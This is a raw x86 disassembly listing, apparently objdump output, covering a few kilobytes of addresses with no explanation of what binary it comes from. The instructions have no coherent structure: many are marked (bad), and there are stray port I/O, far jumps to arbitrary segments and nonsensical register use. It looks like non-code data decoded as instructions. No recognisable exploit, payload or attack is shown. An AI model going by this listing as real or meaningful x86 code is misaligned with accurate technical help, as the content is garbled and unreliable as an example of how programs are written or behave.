  43ecb9:	mov    ecx,0x614b786
  43ecbe:	inc    ebp
  43ecbf:	add    esp,ebx
  43ecc1:	pop    esp
  43ecc2:	or     eax,0xc40a1cc0
  43ecc7:	xor    BYTE PTR [esi],bh
  43ecc9:	mov    ds:0x9d4d3435,al
  43ecce:	adc    ecx,DWORD PTR [ebp-0x5b461dcc]
  43ecd4:	es mov al,0x3c
  43ecd7:	dec    edi
  43ecd8:	test   edx,edx
  43ecda:	pop    esp
  43ecdb:	cli    
  43ecdc:	pusha  
  43ecdd:	sbb    eax,0xa119420d
  43ece2:	rcr    BYTE PTR [esi+0x3afb22af],0x7d
  43ece9:	xor    eax,0x3c594b4c
  43ecee:	or     al,0xe8
  43ecf0:	push   ss
  43ecf1:	jne    0x43eca1
  43ecf3:	xor    eax,0x599e364f
  43ecf8:	push   cs
  43ecf9:	push   esp
  43ecfa:	mov    ah,0xc4
  43ecfc:	mov    ah,0x93
  43ecfe:	or     DWORD PTR [edx+0x67ef4d7a],0xffffff80
  43ed05:	sub    eax,DWORD PTR [edi-0x5b]
  43ed08:	imul   esp,DWORD PTR [ebp+0x6801ed07],0x3d
  43ed0f:	aas    
  43ed10:	outs   dx,BYTE PTR ds:[esi]
  43ed11:	test   eax,0x67bc24b2
  43ed16:	and    eax,DWORD PTR [ebx-0x7b]
  43ed19:	mov    ah,0xfd
  43ed1b:	in     eax,dx
  43ed1c:	push   ebx
  43ed1d:	jecxz  0x43ed38
  43ed1f:	cwde   
  43ed20:	sbb    eax,0x201daae9
  43ed25:	pop    ebx
  43ed26:	xor    al,0x30
  43ed28:	pushf  
  43ed29:	jnp    0x43ecbe
  43ed2b:	je     0x43ecc4
  43ed2d:	mov    WORD PTR [esi+0x25b94dc6],es
  43ed33:	fisubr WORD PTR [ecx-0x29]
  43ed36:	aam    0xa1
  43ed38:	ds gs retf 
  43ed3b:	mov    al,ds:0x26a3c054
  43ed40:	cmp    eax,0x6e06a55a
  43ed45:	lock mov ch,0x54
  43ed48:	mov    eax,gs:0x599fa0bb
  43ed4e:	adc    al,0xe0
  43ed50:	cmp    BYTE PTR [edi+0x43],0xf8
  43ed54:	and    eax,0x1174ba88
  43ed59:	fsub   st,st(0)
  43ed5b:	inc    eax
  43ed5c:	inc    ecx
  43ed5d:	cdq    
  43ed5e:	dec    eax
  43ed5f:	out    dx,eax
  43ed60:	jmp    0xe840:0x6b4ff6a0
  43ed67:	je     0x43eddc
  43ed69:	and    eax,0xa9981a87
  43ed6e:	sti    
  43ed6f:	(bad)  
  43ed70:	push   esp
  43ed71:	cmp    dl,bh
  43ed73:	jo     0x43ed2f
  43ed75:	sahf   
  43ed76:	sbb    DWORD PTR [ebx-0x3],ebp
  43ed79:	push   0x95e320ab
  43ed7e:	je     0x43ed45
  43ed80:	pop    ebx
  43ed82:	stos   DWORD PTR es:[edi],eax
  43ed83:	push   es
  43ed84:	and    ch,bh
  43ed86:	xchg   bh,ah
  43ed88:	dec    ecx
  43ed89:	jne    0x43ed13
  43ed8b:	js     0x43ed23
  43ed8d:	inc    ebp
  43ed8e:	outs   dx,BYTE PTR ds:[esi]
  43ed8f:	icebp  
  43ed90:	xlat   BYTE PTR ds:[ebx]
  43ed91:	jp     0x43edf7
  43ed93:	into   
  43ed94:	sbb    eax,0xf54238c5
  43ed99:	sub    ah,dl
  43ed9b:	xor    DWORD PTR ds:0x9fe55201,0x1f
  43eda2:	jmp    0x43ee06
  43eda4:	sbb    BYTE PTR [ecx+0x4b],bl
  43eda7:	dec    ebx
  43eda8:	mov    dh,0x88
  43edaa:	push   esp
  43edab:	dec    esi
  43edac:	mov    ss,ebx
  43edae:	cmp    esp,DWORD PTR ds:0xf1c2f33c
  43edb4:	and    eax,0x204572b2
  43edb9:	mov    ecx,0xb5f02676
  43edbe:	imul   edi,edi,0xe2e306dd
  43edc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43edc5:	ret    0xeacb
  43edc8:	adc    DWORD PTR [esi+0x77],edi
  43edcb:	cmp    ebx,DWORD PTR [ebx]
  43edcd:	imul   esp,DWORD PTR [esi],0xb360925b
  43edd3:	push   ecx
  43edd4:	es dec ebp
  43edd6:	lods   al,BYTE PTR ds:[esi]
  43edd7:	cld    
  43edd8:	iret   
  43edd9:	js     0x43edfd
  43eddb:	ret    0x36a4
  43edde:	mov    ah,0x34
  43ede0:	vpshlb xmm8,xmm2,[ecx-0x5724c8d0]
  43ede9:	jnp    0x43eda9
  43edeb:	sbb    DWORD PTR [ebp-0x57115113],esi
  43edf1:	ret    0x66d2
  43edf4:	adc    eax,0x1dc42feb
  43edf9:	fldcw  WORD PTR [ecx+0x4b]
  43edfc:	push   ebx
  43edfd:	nop
  43edfe:	cdq    
  43edff:	dec    esi
  43ee00:	pop    ss
  43ee01:	mov    bl,BYTE PTR [eax-0x1c770ab1]
  43ee07:	repnz xor bh,BYTE PTR [eax-0x72]
  43ee0b:	push   cs
  43ee0c:	lds    esi,FWORD PTR [ecx-0x3fca4b42]
  43ee12:	jne    0x43eda3
  43ee14:	in     al,0x9f
  43ee16:	jmp    0x43ee04
  43ee18:	sub    al,0xd2
  43ee1a:	pop    es
  43ee1b:	pshufw mm7,mm1,0x57
  43ee1f:	xchg   edi,eax
  43ee20:	ret    
  43ee21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ee22:	(bad)  
  43ee23:	hlt    
  43ee24:	ja     0x43ee8d
  43ee26:	jp     0x43ee66
  43ee28:	inc    esi
  43ee29:	aas    
  43ee2a:	jp     0x43ee90
  43ee2c:	push   es
  43ee2d:	scas   al,BYTE PTR es:[edi]
  43ee2e:	xchg   BYTE PTR [ecx+ebx*1+0x41],bh
  43ee32:	adc    BYTE PTR [eax],ch
  43ee34:	add    ebx,DWORD PTR [edx+0x42]
  43ee37:	sub    edx,DWORD PTR [esi-0x486a0358]
  43ee3d:	loope  0x43ee2f
  43ee3f:	into   
  43ee40:	dec    edi
  43ee41:	test   al,0x9f
  43ee43:	pop    ebp
  43ee44:	add    eax,0x25128b85
  43ee49:	and    al,0xdd
  43ee4b:	mul    DWORD PTR [ebx+esi*8]
  43ee4e:	fldenv [esi]
  43ee50:	aad    0xe9
  43ee52:	sbb    ebp,DWORD PTR [ebx+0x61]
  43ee55:	push   eax
  43ee56:	mov    esi,0xfcbd0754
  43ee5b:	push   ds
  43ee5c:	xchg   ebp,eax
  43ee5d:	sub    eax,0x8304f3f5
  43ee62:	xor    ch,BYTE PTR [edi+esi*8+0x1659f56a]
  43ee69:	icebp  
  43ee6a:	fld    QWORD PTR [edx]
  43ee6c:	adc    bl,BYTE PTR [ebx]
  43ee6e:	mov    cl,0x16
  43ee70:	cmc    
  43ee71:	add    eax,0x51a7ed37
  43ee76:	lea    esi,[eax+0x22]
  43ee79:	leave  
  43ee7a:	push   esp
  43ee7b:	adc    BYTE PTR [edx-0x682bcd45],bh
  43ee81:	fwait
  43ee82:	sti    
  43ee83:	and    al,cl
  43ee85:	jae    0x43eeac
  43ee87:	clc    
  43ee88:	push   cs
  43ee89:	sub    edx,0xe4a9bf91
  43ee8f:	add    al,0xfe
  43ee91:	sub    bh,dl
  43ee93:	sar    WORD PTR [esp+ebp*1-0x63],1
  43ee98:	dec    edi
  43ee99:	push   0xffffff86
  43ee9b:	mov    DWORD PTR [ebx],ebx
  43ee9d:	xchg   ecx,eax
  43ee9e:	mov    ebp,0xb5cafb0c
  43eea3:	leave  
  43eea4:	sbb    al,0xe9
  43eea6:	xchg   bx,ax
  43eea8:	(bad)  
  43eeaa:	push   0xffffffa8
  43eeac:	add    eax,0x9fee49b7
  43eeb1:	scas   al,BYTE PTR es:[edi]
  43eeb2:	lahf   
  43eeb3:	inc    edx
  43eeb4:	and    DWORD PTR [ecx+0x18],ecx
  43eeb7:	xlat   BYTE PTR ds:[ebx]
  43eeb8:	test   DWORD PTR [ecx-0x74],esi
  43eebb:	loop   0x43eeb6
  43eebd:	push   ebp
  43eebe:	mov    esp,0x9e0aee92
  43eec3:	sub    ebp,ecx
  43eec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43eec6:	mov    edx,0x3d192194
  43eecb:	inc    ebx
  43eecc:	inc    eax
  43eecd:	pop    edx
  43eece:	sbb    esp,DWORD PTR [ebx+0x140c86ea]
  43eed4:	mov    edi,0xc5315ac9
  43eed9:	mov    gs,ebx
  43eedb:	pop    esi
  43eedc:	in     eax,dx
  43eedd:	push   ebp
  43eede:	ds std 
  43eee0:	add    BYTE PTR [ebx+0x3e795680],bl
  43eee6:	mov    eax,0x3ba0d4f4
  43eeeb:	mov    bl,0xf6
  43eeed:	cwde   
  43eeee:	pop    edx
  43eeef:	cmp    esp,ecx
  43eef1:	add    bl,0x45
  43eef4:	pop    ds
  43eef5:	or     DWORD PTR [eax],ebx
  43eef7:	xchg   esp,eax
  43eef8:	nop
  43eef9:	stos   BYTE PTR es:[edi],al
  43eefa:	jb     0x43ee81
  43eefc:	in     eax,dx
  43eefd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43eefe:	sti    
  43eeff:	outs   dx,BYTE PTR ds:[esi]
  43ef00:	outs   dx,BYTE PTR ds:[esi]
  43ef01:	fucomp st(6)
  43ef03:	gs sahf 
  43ef05:	stc    
  43ef06:	js     0x43ef1b
  43ef08:	or     BYTE PTR [ecx],ah
  43ef0a:	jnp    0x43eed2
  43ef0c:	dec    esi
  43ef0d:	inc    ebp
  43ef0e:	mov    ch,0x98
  43ef10:	push   esp
  43ef11:	test   al,0x4b
  43ef13:	mov    BYTE PTR [ebp-0x14],0x6f
  43ef17:	push   cs
  43ef18:	xor    bh,BYTE PTR [esi-0x59e8ae51]
  43ef1e:	mov    dl,0xc4
  43ef20:	fcmovnb st,st(7)
  43ef22:	repnz sub edx,DWORD PTR ds:0x82f3374f
  43ef29:	call   0xd3b6:0xa0e6af3e
  43ef30:	lea    eax,[ebp-0x4a]
  43ef33:	hlt    
  43ef34:	push   ebx
  43ef35:	sbb    esp,DWORD PTR [edi+esi*8+0x75]
  43ef39:	sbb    esi,DWORD PTR [ecx-0x31550d1b]
  43ef3f:	jns    0x43ef54
  43ef41:	in     al,dx
  43ef42:	mov    dl,0x37
  43ef44:	scas   al,BYTE PTR es:[edi]
  43ef45:	push   cs
  43ef46:	pop    ds
  43ef47:	and    al,0x91
  43ef49:	adc    eax,0x60e41c1a
  43ef4e:	mov    ecx,0xe5682f12
  43ef53:	call   0xe9c357ed
  43ef58:	shr    BYTE PTR [esi],1
  43ef5a:	ror    ecx,1
  43ef5c:	sbb    al,0x19
  43ef5e:	cmp    bl,bl
  43ef60:	fsub   QWORD PTR [esi]
  43ef62:	mov    ebp,0xabb5fa50
  43ef67:	or     eax,0x31200f6a
  43ef6c:	xor    BYTE PTR [edi+0x59936b6d],ah
  43ef72:	rcl    ah,cl
  43ef74:	int3   
  43ef75:	rol    edx,0x65
  43ef78:	sub    BYTE PTR [edx],0xb8
  43ef7b:	add    ah,ch
  43ef7d:	outs   dx,DWORD PTR ds:[esi]
  43ef7e:	xlat   BYTE PTR ds:[ebx]
  43ef7f:	in     al,dx
  43ef80:	cmp    esi,0x44
  43ef83:	pushf  
  43ef84:	daa    
  43ef85:	stc    
  43ef86:	adc    eax,DWORD PTR [eax+0x6e31d950]
  43ef8c:	daa    
  43ef8d:	adc    eax,0x9bb9903a
  43ef92:	mov    ebx,0xf9b801ba
  43ef97:	pushf  
  43ef98:	popa   
  43ef99:	ret    0xfdb3
  43ef9c:	pop    ss
  43ef9d:	aad    0xb5
  43ef9f:	je     0x43ef57
  43efa1:	orps   xmm6,XMMWORD PTR [esi]
  43efa4:	xchg   al,al
  43efa6:	adc    DWORD PTR [eax],ebx
  43efa8:	and    BYTE PTR [ecx],al
  43efaa:	and    al,0xf4
  43efac:	test   al,0x1d
  43efae:	mov    cl,0xce
  43efb0:	mov    ch,0xcf
  43efb2:	mov    bh,0x14
  43efb4:	inc    esp
  43efb5:	jle    0x43ef92
  43efb7:	adc    BYTE PTR ds:0xf3e7e758,dh
  43efbd:	dec    esi
  43efbe:	cld    
  43efbf:	fs (bad) 
  43efc2:	cmp    al,0xf5
  43efc4:	xlat   BYTE PTR ds:[ebx]
  43efc5:	jle    0x43f03f
  43efc7:	jne    0x43efd8
  43efc9:	(bad)  
  43efca:	int3   
  43efcb:	lock pop ebp
  43efcd:	jg     0x43efac
  43efcf:	cdq    
  43efd0:	repz rcl DWORD PTR [edi-0x6a],0x69
  43efd5:	in     al,dx
  43efd6:	(bad)  
  43efd7:	fnsave [eax]
  43efd9:	(bad)  
  43efda:	mov    edi,0xc9435860
  43efdf:	and    al,0xe5
  43efe1:	push   0x50
  43efe3:	and    BYTE PTR [ebx],ch
  43efe5:	mov    eax,ds:0xcb38717b
  43efea:	xchg   ecx,eax
  43efeb:	xchg   esi,eax
  43efec:	mov    edi,0x1f2730c7
  43eff1:	js     0x43f00e
  43eff3:	ins    BYTE PTR es:[di],dx
  43eff5:	jmp    0x13eb:0x9a85c4ba
  43effc:	or     al,0x98
  43effe:	mov    ds:0x66f1b78d,eax
  43f003:	mov    eax,0x4bf1741
  43f008:	repz xor al,0xa8
  43f00b:	outs   dx,DWORD PTR ds:[esi]
  43f00c:	jne    0x43efb4
  43f00e:	test   al,0xf0
  43f010:	push   ds
  43f011:	cmp    eax,0xd920136f
  43f016:	pop    ecx
  43f017:	mov    DWORD PTR [edx-0x42],edi
  43f01a:	or     al,0xcf
  43f01c:	dec    edi
  43f01d:	jns    0x43f03e
  43f01f:	cld    
  43f020:	pop    ss
  43f021:	add    DWORD PTR ds:0xae0ffda9,esi
  43f027:	sub    ah,bh
  43f029:	cmp    dh,BYTE PTR [esp+ecx*2+0x3fcb0524]
  43f030:	inc    eax
  43f031:	out    0xf5,al
  43f033:	mov    ebp,ds
  43f035:	pushf  
  43f036:	fwait
  43f037:	pop    DWORD PTR [edx]
  43f039:	jbe    0x43f031
  43f03b:	sti    
  43f03c:	ror    DWORD PTR [ebp-0x74],cl
  43f03f:	sub    BYTE PTR [ebp+0x67],cl
  43f042:	nop
  43f043:	cmc    
  43f044:	push   ebx
  43f045:	push   edx
  43f046:	mov    bh,0xf6
  43f048:	out    dx,eax
  43f049:	fcom   st(1)
  43f04b:	iret   
  43f04c:	in     al,0xb7
  43f04e:	lods   al,BYTE PTR ds:[esi]
  43f04f:	jae    0x43f097
  43f051:	repz sub eax,0x32a0dc63
  43f057:	cdq    
  43f058:	pop    ss
  43f059:	pusha  
  43f05a:	addr16 xchg esi,edx
  43f05d:	icebp  
  43f05e:	mov    cl,0x84
  43f060:	adc    eax,0x46c1c5a8
  43f065:	jo     0x43f0c0
  43f067:	pop    ebx
  43f068:	xchg   esi,eax
  43f069:	popf   
  43f06a:	idiv   ah
  43f06c:	mov    es,WORD PTR [ecx+0x27]
  43f06f:	je     0x43f0c0
  43f071:	jne    0x43f028
  43f073:	inc    esp
  43f074:	or     eax,0xd5341e42
  43f079:	clc    
  43f07a:	xor    al,0xf4
  43f07d:	sbb    dh,ah
  43f07f:	cld    
  43f080:	sub    cl,cl
  43f082:	push   ecx
  43f083:	mov    cl,0xd4
  43f085:	int    0x1a
  43f087:	pop    edx
  43f088:	call   0x482f:0x9b50c3b6
  43f08f:	scas   eax,DWORD PTR es:[edi]
  43f090:	fsubr  QWORD PTR [ebx+0x2898a4ec]
  43f096:	nop
  43f097:	push   cs
  43f098:	sbb    al,0x9
  43f09a:	das    
  43f09b:	mov    esp,0x34c85b6d
  43f0a0:	sbb    DWORD PTR [ebp-0x57032465],esp
  43f0a6:	fisub  WORD PTR [eax+edx*2-0x50]
  43f0aa:	and    BYTE PTR [ebp+0x4599d24e],cl
  43f0b0:	adc    dh,bl
  43f0b2:	adc    BYTE PTR [edx+ebp*2-0xa],bl
  43f0b6:	int3   
  43f0b7:	jmp    0x43f12f
  43f0b9:	test   al,0xcf
  43f0bb:	sub    eax,DWORD PTR ds:0xcc9efba0
  43f0c1:	(bad)  
  43f0c2:	mov    al,0x66
  43f0c4:	lods   eax,DWORD PTR ds:[esi]
  43f0c5:	dec    edi
  43f0c6:	dec    DWORD PTR ds:0x45ae0e18
  43f0cc:	mov    ch,0xc
  43f0ce:	out    0xea,eax
  43f0d0:	sbb    al,0xd2
  43f0d2:	fwait
  43f0d3:	pop    ebx
  43f0d4:	fmul   QWORD PTR [ecx+0x28]
  43f0d7:	sub    al,0x9b
  43f0d9:	xlat   BYTE PTR ds:[ebx]
  43f0da:	and    al,0x22
  43f0dc:	and    eax,0x5288bb79
  43f0e1:	add    eax,0xe2320134
  43f0e6:	mov    ecx,0xcd4d3512
  43f0eb:	jmp    0x43f15c
  43f0ed:	jno    0x43f0c8
  43f0ef:	inc    esp
  43f0f0:	(bad)  
  43f0f1:	loopne 0x43f0a9
  43f0f3:	sbb    al,BYTE PTR ss:[edx]
  43f0f6:	call   0xc6f3c92f
  43f0fb:	mov    edi,0x8985d596
  43f100:	dec    edx
  43f101:	sbb    al,0x59
  43f103:	jmp    0xc060f0cf
  43f108:	push   esi
  43f109:	dec    eax
  43f10a:	lea    ebx,ds:0xdbcc241b
  43f110:	sbb    eax,0xd0e5fff9
  43f115:	fnstenv [ebp-0x43]
  43f118:	in     eax,dx
  43f119:	jns    0x43f0d9
  43f11b:	and    eax,0xab9ba235
  43f120:	rol    BYTE PTR [edi-0x42],cl
  43f123:	pop    esi
  43f124:	push   ebp
  43f125:	test   eax,0x64fab6c8
  43f12a:	jne    0x43f132
  43f12c:	loop   0x43f155
  43f12e:	jmp    edi
  43f130:	mul    DWORD PTR [eax+0x62152033]
  43f136:	in     al,dx
  43f137:	out    dx,eax
  43f138:	adc    al,0x55
  43f13a:	jmp    0xe388d956
  43f13f:	in     al,0xb3
  43f141:	mov    cl,0x78
  43f143:	mov    esp,0x9aaa28d9
  43f148:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f149:	inc    ebx
  43f14a:	std    
  43f14b:	dec    ecx
  43f14c:	and    eax,0x50e517f6
  43f151:	jae    0x43f122
  43f153:	xchg   edx,eax
  43f154:	or     esp,ebp
  43f156:	mov    bl,0xa4
  43f158:	in     eax,0x9d
  43f15a:	out    dx,al
  43f15b:	or     eax,0xed15e9b5
  43f160:	dec    edi
  43f161:	cdq    
  43f162:	pop    edx
  43f163:	aaa    
  43f164:	sbb    eax,0x2e85a529
  43f169:	mov    al,0x38
  43f16b:	mov    ebp,0xc40ba4ff
  43f170:	adc    BYTE PTR [ebx-0x56],ch
  43f173:	cmp    eax,0x3d2cab37
  43f178:	xchg   ebp,eax
  43f179:	cmp    DWORD PTR [edx],esi
  43f17b:	add    BYTE PTR [ebx*8-0x639b1188],0xbf
  43f183:	add    eax,DWORD PTR ds:0xa5f3ddea
  43f189:	aad    0x5
  43f18b:	and    ah,BYTE PTR [edx]
  43f18d:	sub    DWORD PTR [eax+0x77],esp
  43f190:	mov    BYTE PTR [ecx],0x2a
  43f193:	into   
  43f194:	inc    edx
  43f195:	lahf   
  43f196:	stos   DWORD PTR es:[edi],eax
  43f197:	sahf   
  43f198:	pusha  
  43f199:	retf   
  43f19a:	out    dx,al
  43f19b:	cdq    
  43f19c:	dec    esi
  43f19d:	sbb    DWORD PTR [edx-0x4b8744fd],edx
  43f1a3:	aam    0x66
  43f1a5:	fisttp WORD PTR [edx]
  43f1a7:	int3   
  43f1a8:	jne    0x43f143
  43f1aa:	mov    ds:0xf0a523f3,al
  43f1af:	rcr    BYTE PTR [eax],0x89
  43f1b2:	std    
  43f1b3:	imul   edi,DWORD PTR [esi-0x4a6a52c3],0xffffff9b
  43f1ba:	or     esi,DWORD PTR [ebx+0x9]
  43f1bd:	xor    ebp,DWORD PTR ss:[edi+0x57d5ba86]
  43f1c4:	popf   
  43f1c5:	jmp    0x5c3b:0x394f24ce
  43f1cc:	je     0x43f167
  43f1ce:	sti    
  43f1cf:	mov    dl,0xf7
  43f1d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f1d2:	jns    0x43f199
  43f1d4:	and    bh,BYTE PTR [edx-0x50]
  43f1d7:	stos   DWORD PTR es:[edi],eax
  43f1d8:	cdq    
  43f1d9:	add    bh,BYTE PTR [ecx+0xf233874]
  43f1df:	mov    edx,0x79f45009
  43f1e4:	and    bl,BYTE PTR [ecx+0x1ec928a7]
  43f1ea:	cmc    
  43f1eb:	add    eax,0xec211923
  43f1f0:	pop    edi
  43f1f1:	int3   
  43f1f2:	or     edx,DWORD PTR [edi+0x37]
  43f1f5:	cdq    
  43f1f6:	sbb    ebp,DWORD PTR [ecx+0x61]
  43f1f9:	adc    BYTE PTR [edi+0x2046308],al
  43f1ff:	cmp    dh,bl
  43f201:	xchg   BYTE PTR [ebx+0x1c11dfd4],bh
  43f207:	add    dl,ch
  43f209:	push   esp
  43f20a:	(bad)  
  43f20b:	in     eax,dx
  43f20c:	imul   ebp,DWORD PTR [esi],0x5d
  43f20f:	(bad)  
  43f210:	and    ecx,DWORD PTR [ecx+0x802ef3c]
  43f216:	retf   0xb00c
  43f219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f21a:	jnp    0x43f1e3
  43f21c:	dec    ecx
  43f21d:	cmp    bl,BYTE PTR [esi+0x70f4c1f6]
  43f223:	aas    
  43f224:	push   eax
  43f225:	cmc    
  43f226:	mov    ebp,0x91167fb4
  43f22b:	out    0xc4,eax
  43f22d:	cdq    
  43f22e:	sub    eax,DWORD PTR [ebp-0x16]
  43f231:	outs   dx,DWORD PTR ds:[esi]
  43f232:	popa   
  43f233:	and    eax,0xfdcdb1d
  43f238:	push   esp
  43f239:	sbb    edi,DWORD PTR [edi+0x21246414]
  43f23f:	adc    BYTE PTR [esi],dl
  43f241:	dec    edx
  43f242:	nop    DWORD PTR [edx+0x7a2af48e]
  43f249:	scas   eax,DWORD PTR es:[edi]
  43f24a:	cmp    ebx,DWORD PTR [edi+0x6f]
  43f24d:	clc    
  43f24e:	loope  0x43f1f4
  43f250:	pop    ecx
  43f251:	mov    al,ds:0x67685a56
  43f256:	popf   
  43f257:	imul   esp,DWORD PTR [ebp+0x12],0x9c1644dc
  43f25e:	(bad)  
  43f25f:	repnz pop es
  43f261:	xlat   BYTE PTR ds:[ebx]
  43f262:	lahf   
  43f263:	mov    BYTE PTR [ebx+ebx*1-0x43],bh
  43f267:	(bad)  
  43f268:	fcom   QWORD PTR [ebp+0x8]
  43f26b:	mov    dl,0x65
  43f26d:	and    DWORD PTR [ebx+esi*8+0x41f1c47c],0x9acb291b
  43f278:	cli    
  43f279:	adc    BYTE PTR [eax+ecx*2+0x2],dl
  43f27d:	call   0x197c:0x894d1ecb
  43f284:	dec    ebx
  43f285:	fisttp QWORD PTR [edx-0x5545e39b]
  43f28b:	(bad)  
  43f28c:	sub    bh,dh
  43f28e:	mov    dl,0xe4
  43f290:	adc    DWORD PTR [esi-0x1fed1cd5],ebx
  43f296:	jbe    0x43f23d
  43f298:	dec    eax
  43f299:	jne    0x43f27a
  43f29b:	inc    ebp
  43f29c:	jo     0x43f245
  43f29e:	cmp    edi,DWORD PTR [eax]
  43f2a0:	fs jnp 0x43f26b
  43f2a3:	sbb    BYTE PTR [ecx],bh
  43f2a5:	sbb    DWORD PTR ds:0x1ba3a619,0x56816e52
  43f2af:	ja     0x43f2cb
  43f2b1:	jns    0x43f30f
  43f2b3:	out    dx,al
  43f2b4:	sub    eax,0xa8c078d
  43f2b9:	popf   
  43f2ba:	(bad)  
  43f2bb:	mov    esi,0x38b13d54
  43f2c0:	push   ss
  43f2c1:	jns    0x43f333
  43f2c3:	(bad)  [ebx+0x5064c271]
  43f2c9:	pushf  
  43f2ca:	dec    ebx
  43f2cb:	or     bh,ah
  43f2cd:	shl    BYTE PTR [edi-0x7f72b23],1
  43f2d3:	lock nop
  43f2d5:	(bad)  
  43f2d6:	mov    ecx,0xb9807324
  43f2db:	loopne 0x43f2b6
  43f2dd:	fsubr  QWORD PTR [ebp-0x20]
  43f2e0:	and    cl,ch
  43f2e2:	lea    eax,[eax+0x484ee5dd]
  43f2e8:	add    eax,0x24baf361
  43f2ed:	sub    ecx,edx
  43f2ef:	pause  
  43f2f1:	jns    0x43f281
  43f2f3:	ror    DWORD PTR ds:0x553c3ba2,1
  43f2f9:	add    al,0x3a
  43f2fb:	push   0x58c7fced
  43f300:	push   ebx
  43f301:	and    edi,DWORD PTR [esi+edx*4+0x23]
  43f305:	mov    ecx,0x7c58ce2c
  43f30a:	pop    es
  43f30b:	dec    edi
  43f30c:	test   DWORD PTR [ebx],ebx
  43f30e:	(bad)  
  43f30f:	out    dx,eax
  43f310:	adc    DWORD PTR [eax],ebx
  43f312:	arpl   di,sp
  43f314:	and    DWORD PTR [ecx],edi
  43f316:	outs   dx,DWORD PTR ds:[esi]
  43f317:	popf   
  43f318:	jno    0x43f310
  43f31a:	mov    edi,edx
  43f31c:	dec    ebp
  43f31d:	out    dx,al
  43f31e:	dec    ebx
  43f31f:	ins    DWORD PTR es:[edi],dx
  43f320:	ds sti 
  43f322:	ret    
  43f323:	cmp    esp,DWORD PTR [ecx]
  43f325:	mov    cl,0xa4
  43f327:	nop
  43f328:	and    DWORD PTR [esi+0x30bf62ab],ebx
  43f32e:	fstp   QWORD PTR [edi+0x30]
  43f331:	(bad)  
  43f332:	lods   eax,DWORD PTR ds:[esi]
  43f333:	and    ecx,esp
  43f335:	jmp    0x43f2ed
  43f337:	add    al,0xfd
  43f339:	stos   BYTE PTR es:[edi],al
  43f33a:	ins    BYTE PTR es:[edi],dx
  43f33b:	sbb    al,ch
  43f33d:	dec    esp
  43f33e:	jnp    0x43f330
  43f340:	mov    eax,ds:0x9c935c8f
  43f345:	std    
  43f346:	retf   
  43f347:	out    0x25,eax
  43f349:	ja     0x43f328
  43f34b:	lock ja 0x43f346
  43f34e:	push   es
  43f34f:	or     esi,ebp
  43f351:	push   es
  43f352:	pop    ds
  43f353:	out    dx,al
  43f354:	xor    al,0xb3
  43f356:	js     0x43f3c3
  43f358:	pop    ds
  43f359:	dec    ecx
  43f35a:	cld    
  43f35b:	pop    edx
  43f35c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f35d:	or     eax,DWORD PTR [ebx]
  43f35f:	rcl    DWORD PTR [ecx+0xa],1
  43f362:	cmp    al,0x7f
  43f364:	(bad)
  43f367:	int    0x64
  43f369:	sub    edx,DWORD PTR [ecx-0x11]
  43f36c:	sbb    al,0x9
  43f36e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f36f:	or     ah,BYTE PTR [eax]
  43f371:	add    BYTE PTR [ebx-0x536c0b57],0xe9
  43f378:	imul   esp,DWORD PTR ds:0x41596f44,0x36baf471
  43f382:	jmp    0x4c14:0xb64744cb
  43f389:	(bad)  
  43f38a:	arpl   WORD PTR ds:0xed7b6905,sp
  43f390:	mov    cl,0xfb
  43f392:	div    cl
  43f394:	add    ch,BYTE PTR [ebp+0x6d]
  43f397:	stos   BYTE PTR es:[edi],al
  43f398:	sbb    eax,0xad72c689
  43f39d:	test   ch,0xde
  43f3a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f3a1:	adc    al,0xd
  43f3a3:	push   0x2d
  43f3a5:	pop    eax
  43f3a6:	jl     0x43f360
  43f3a8:	sbb    esp,DWORD PTR [ecx+0x1035d0c6]
  43f3ae:	(bad)  
  43f3af:	mov    dl,0x6d
  43f3b1:	add    al,0xc8
  43f3b3:	xor    BYTE PTR fs:[ecx-0x2b],cl
  43f3b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f3b8:	sub    al,0xa1
  43f3ba:	mov    ebx,0x637ce8a3
  43f3bf:	pushf  
  43f3c0:	jae    0x43f3ec
  43f3c2:	outs   dx,DWORD PTR ds:[esi]
  43f3c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f3c4:	sbb    eax,0x5b04b244
  43f3c9:	leave  
  43f3ca:	inc    edx
  43f3cb:	push   edx
  43f3cc:	jbe    0x43f3b9
  43f3ce:	and    al,0x1a
  43f3d0:	in     al,0xff
  43f3d2:	ss mov cl,0xee
  43f3d5:	mov    ?,WORD PTR [edx-0x4b8f6eb1]
  43f3db:	xchg   esp,eax
  43f3dc:	aad    0x2c
  43f3de:	shl    DWORD PTR [ebp+0x3d],1
  43f3e1:	(bad)  
  43f3e2:	dec    esp
  43f3e3:	dec    edi
  43f3e4:	pop    ebx
  43f3e5:	xchg   ebx,eax
  43f3e6:	cmp    cl,cl
  43f3e8:	xchg   esp,eax
  43f3e9:	pop    ss
  43f3ea:	mov    cl,0x86
  43f3ec:	push   ds
  43f3ed:	dec    ecx
  43f3ee:	sahf   
  43f3ef:	and    al,0xa1
  43f3f1:	rcl    BYTE PTR [ecx+esi*2+0x75ab9c84],0x62
  43f3f9:	stos   DWORD PTR es:[edi],eax
  43f3fa:	test   eax,0x31903963
  43f3ff:	fist   WORD PTR [edx]
  43f401:	cmp    BYTE PTR [edi-0x7803c66c],0xb4
  43f408:	add    eax,0x33ebfcb1
  43f40d:	pop    ecx
  43f40e:	xchg   BYTE PTR [ecx],al
  43f410:	sbb    DWORD PTR [ecx],ecx
  43f412:	fwait
  43f413:	je     0x43f3c1
  43f415:	out    dx,al
  43f416:	pop    ss
  43f417:	ficom  DWORD PTR [ebp+0x52ef69f]
  43f41d:	(bad)  
  43f41e:	leave  
  43f41f:	call   0x69da9292
  43f424:	sbb    eax,0xc946a5f9
  43f429:	sti    
  43f42a:	adc    esi,DWORD PTR [esi]
  43f42c:	add    al,0x9a
  43f42e:	pop    ebx
  43f42f:	jecxz  0x43f400
  43f431:	inc    eax
  43f432:	fstp   st(5)
